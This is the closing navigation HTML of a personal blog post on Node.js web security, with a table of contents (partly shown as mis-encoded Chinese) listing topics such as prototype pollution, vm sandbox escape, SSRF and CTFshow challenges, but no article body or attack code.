class="tag-item"><a href="/tags/Node-js/">#Node.js</a>&nbsp;</li><li class="tag-item"><a href="/tags/JavaScript/">#JavaScript</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2023/06/21/pwn_patch/"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">Pwn_patch</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2023/04/25/AWD/"><span class="title flex-center"><span class="post-nav-title-item">Web_ç•ªå¤–ç¯‡_AWDèŠå£«</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;Comments</div><div class="waline-comment-container"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline-meta.css"><script src="//unpkg.com/@waline/client@v2/dist/waline.js"></script><div id="waline-comment"></div><script>function loadWaline(){Waline.init({el:"#waline-comment",serverURL:"https://waline-charmersix.vercel.app/",lang:"en",comment:".post-comments-count",reaction:!0})}window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Node-js%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">Node.jsåŸºç¡€</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Node-js-%E5%AE%89%E8%A3%85"><span class="nav-number">1.1.</span> <span class="nav-text">Node.js å®‰è£…</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">1.2.</span> <span class="nav-text">è¯»å–æ–‡ä»¶æ“ä½œ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">1.3.</span> <span class="nav-text">å…¨å±€å˜é‡</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.4.</span> <span class="nav-text">HTTPæœåŠ¡</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#child-process-%E5%88%9B%E5%BB%BA%E5%AD%90%E8%BF%9B%E7%A8%8B"><span class="nav-number">1.5.</span> <span class="nav-text">child_process(åˆ›å»ºå­è¿›ç¨‹)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Node-js%E7%89%B9%E6%80%A7"><span class="nav-number">2.</span> <span class="nav-text">Node.jsç‰¹æ€§</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="nav-number">2.1.</span> <span class="nav-text">å¤§å°å†™ç‰¹æ€§</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="nav-number">2.2.</span> <span class="nav-text">å¼±ç±»å‹æ¯”è¾ƒ</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E6%AF%94%E8%BE%83"><span class="nav-number">2.2.1.</span> <span class="nav-text">å¤§å°æ¯”è¾ƒ</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E6%AF%94%E8%BE%83"><span class="nav-number">2.2.2.</span> <span class="nav-text">æ•°ç»„æ¯”è¾ƒ</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E6%AF%94%E8%BE%83%E7%89%B9%E5%88%AB%E7%9A%84%E7%9B%B8%E7%AD%89"><span class="nav-number">2.2.3.</span> <span class="nav-text">ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="nav-number">2.2.4.</span> <span class="nav-text">å˜é‡æ‹¼æ¥</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MD5%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.</span> <span class="nav-text">MD5çš„ç»•è¿‡</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.</span> <span class="nav-text">ç¼–ç ç»•è¿‡</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#16%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="nav-number">2.4.1.</span> <span class="nav-text">16è¿›åˆ¶ç¼–ç </span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Unicode%E7%BC%96%E7%A0%81"><span class="nav-number">2.4.2.</span> <span class="nav-text">Unicodeç¼–ç </span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#base%E7%BC%96%E7%A0%81"><span class="nav-number">2.4.3.</span> <span class="nav-text">baseç¼–ç </span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Node-js%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">Node.jså±é™©å‡½æ•°çš„åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">3.1.</span> <span class="nav-text">å‘½ä»¤æ‰§è¡Œ&#x2F;ä»£ç æ‰§è¡Œ</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#exec"><span class="nav-number">3.1.1.</span> <span class="nav-text">exec()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#eval"><span class="nav-number">3.1.2.</span> <span class="nav-text">eval()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="nav-number">3.2.</span> <span class="nav-text">æ–‡ä»¶è¯»å†™</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#readFileSync"><span class="nav-number">3.2.1.</span> <span class="nav-text">readFileSync()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#readFile"><span class="nav-number">3.2.2.</span> <span class="nav-text">readFile()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#writeFileSync"><span class="nav-number">3.2.3.</span> <span class="nav-text">writeFileSync()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#writeFile"><span class="nav-number">3.2.4.</span> <span class="nav-text">writeFile()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RCE-ByPass"><span class="nav-number">3.3.</span> <span class="nav-text">RCE_ByPass</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Node-js%E4%B8%AD%E7%9A%84ssrf"><span class="nav-number">4.</span> <span class="nav-text">Node.jsä¸­çš„ssrf</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">4.1.</span> <span class="nav-text">åŸç†</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Crlf-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">4.2.</span> <span class="nav-text">Crlf HTTPå¤´æ³¨å…¥</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-number">5.</span> <span class="nav-text">Node.jsåŸå‹é“¾æ±¡æŸ“</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#prototype%E5%92%8C-proto"><span class="nav-number">5.1.</span> <span class="nav-text">prototypeå’Œ__proto__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF%E6%80%9D%E6%83%B3"><span class="nav-number">5.2.</span> <span class="nav-text">åŸå‹é“¾ç»§æ‰¿æ€æƒ³</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%A6%82%E4%BD%95%E6%B1%A1%E6%9F%93"><span class="nav-number">5.3.</span> <span class="nav-text">åŸå‹é“¾å®šä¹‰åŠå¦‚ä½•æ±¡æŸ“</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%85%8D%E5%90%88RCE"><span class="nav-number">5.4.</span> <span class="nav-text">åŸå‹é“¾æ±¡æŸ“é…åˆRCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-number">5.5.</span> <span class="nav-text">vmæ²™ç®±é€ƒé€¸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#merge%E6%93%8D%E4%BD%9C%E5%AF%BC%E8%87%B4%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-number">5.6.</span> <span class="nav-text">mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ejs%E6%B1%A1%E6%9F%93"><span class="nav-number">5.7.</span> <span class="nav-text">ejsæ±¡æŸ“</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lodash%E6%B1%A1%E6%9F%93"><span class="nav-number">5.8.</span> <span class="nav-text">lodashæ±¡æŸ“</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JQuery%E6%B1%A1%E6%9F%93"><span class="nav-number">5.9.</span> <span class="nav-text">JQueryæ±¡æŸ“</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8-1"><span class="nav-number">5.10.</span> <span class="nav-text">vmæ²™ç®±é€ƒé€¸</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E5%87%A0%E4%B8%AA%E9%A2%98-CTFshow"><span class="nav-number">6.</span> <span class="nav-text">åšå‡ ä¸ªé¢˜(CTFshow)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web334"><span class="nav-number">6.1.</span> <span class="nav-text">web334</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web335"><span class="nav-number">6.2.</span> <span class="nav-text">web335</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web336"><span class="nav-number">6.3.</span> <span class="nav-text">web336</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web337"><span class="nav-number">6.4.</span> <span class="nav-text">web337</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web338"><span class="nav-number">6.5.</span> <span class="nav-text">web338</span></a></li></ol></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2022.04.28</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate"></i> &nbsp;<a href="/">Charmersix</a></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item">Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp; Totalview&nbsp;<span id="busuanzi_value_site_pv"></span></div><div class="theme-info info-item">Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a></div></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/local-search.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/code-block.js"></script><div class="post-scripts"><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/toc.js"></script></div></body></html>